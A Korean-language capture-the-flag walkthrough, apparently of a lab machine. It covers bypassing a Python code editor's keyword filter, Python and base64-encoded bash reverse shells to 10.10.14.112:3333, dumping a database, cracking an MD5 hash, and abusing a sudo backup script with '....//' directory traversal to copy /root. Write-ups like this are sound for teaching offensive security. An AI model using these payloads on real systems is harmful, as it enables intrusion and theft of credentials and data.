# solve

- nmap 시 22,5000이 열려있다. 5000은 http인 걸 봐서 Gunicorn이라는 웹 앱이 돌아가는 듯
![[Pasted image 20251021154210.png]]

- 5000포트는 gunicorn 기반 파이썬 코드 에디터이다. 코드를 실행할 수 있지만, os, open 등 몇가지 단어에 필터링이 걸려있다.
	- os, open, import 등이 필터링
![[Pasted image 20251021165738.png]]

- 위 코드에서 주석으로 `# import`와 같이 적어도 use of ...가 뜨는 걸 보니, 해당 에디터는 string 형식으로 불러와서 필터링하는 듯 하다. 따라서 pyjail 중 string filter bypass를 해야 함. 아래와 같은 코드를 짜서 username을 알아내는 코드를 실행하였다.
```
imp = "__im" + "port__"        
bkey = "__bui" + "ltins__"      
mod = "get" + "pass"           

bi = globals()[bkey]           
d = bi if isinstance(bi, dict) else bi.__dict__
module = d[imp](mod)           
getuser = getattr(module, "getuser")
print(getuser())
```
이때, `import -> "__im"+"port__"`  등과 같이 필터링 우회 가능
> 참고: https://n9ne-tail.tistory.com/87
![[Pasted image 20251021173728.png]]

- 그 후 위와 같은 방식으로 builtins 필터링 우회 및 os도 필터링 우회 등등해서 리버스쉘 받기 성공
```
imp = "__im" + "port__"
bkey = "__bui" + "ltins__"

bi = globals()[bkey]
d = bi if isinstance(bi, dict) else bi.__dict__
module = d[imp]

o_mod = module("o"+"s")
pty_mod = module("pty")
socket_mod = module("socket")

s = socket_mod.socket()
s.connect(("10.10.14.112", 3333))

for fd in (0, 1, 2):
    o_mod.dup2(s.fileno(), fd)

pty_mod.spawn("/bin/sh")
```
![[Pasted image 20251021180645.png]]

- (추가) 다른 방식의 페이로드 - echo와 base64 이용
```
echo -n 'bash -i  >&   /dev/tcp/10.10.14.112/3333 0>&1' | base64 -w 0;echo
```
![[Pasted image 20251021190629.png]]
```
[].__class__.__base__.__subclasses__()[317](['bash', '-c', 'echo YmFzaCAtaSAgPiYgICAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMzMzMyAwPiYx | base64 -d | bash'])
```
![[Pasted image 20251021191043.png]]

- 이후 user의 홈 디렉터리에서 user.txt 읽기 성공
![[Pasted image 20251021180800.png]]

- db파일은 유저 디렉터리의 app/instance 안에 존재
![[Pasted image 20251021192652.png]]

- 추가로 `/etc/passwd`에서 martin이라는 유저도 있는 것을 발견
![[Pasted image 20251021192802.png]]

- 현재 유저 디렉터리에서 `app/instance`의 database.db파일을 발견 후 덤핑하여 martin 유저의 비밀번호가 md5로 저장되어 있는 것을 발견. 덤프를 해야지 바이너리 내용이 사람이 볼 수 있게 바뀐다.
![[Pasted image 20251021194326.png]]

- 이후 john the ripper로 해시 크래킹 성공
![[Pasted image 20251021194550.png]]

- martin으로 ssh 로그인. 이때, `sudo -l`시 `backy.sh`라는 파일을 sudo로 비번 없이 실행하는 것을 발견
![[Pasted image 20251021195737.png]]
![[Pasted image 20251021200456.png]]

- backy.sh를 열어보면 어떤 jq 명령을 수행하고 `task.json`에 갱신해서 넣는다. 해당 jq명령을 실행해보면 `../`를 찾아서 제거한다. 따라서 아래와 같이 `....//`처럼 입력하면 jq명령을 실행해도 `../`가 되어서 디렉터리 트레버설이 가능하다.
![[Pasted image 20251022111836.png]]

- 따라서, 디렉터리 트레버설을 이용해서 `task.json`을 수정해서 `/home/martin/backups`에다가 `/root`의 디렉터리 전체를 복하도록 함. 그럼 아래와 같이 tar.bz로 압축되어서 복사된다.
![[Pasted image 20251022112419.png]]

- scp를 이용해서 로컬 kali로 옮긴 다음에, root.txt를를 읽기 성공
![[Pasted image 20251022112726.png]]
![[Pasted image 20251022112752.png]]

- 물론, root/.ssh에 root의 개인키가 있기 때문에 root로 ssh 로그인도 가능하다.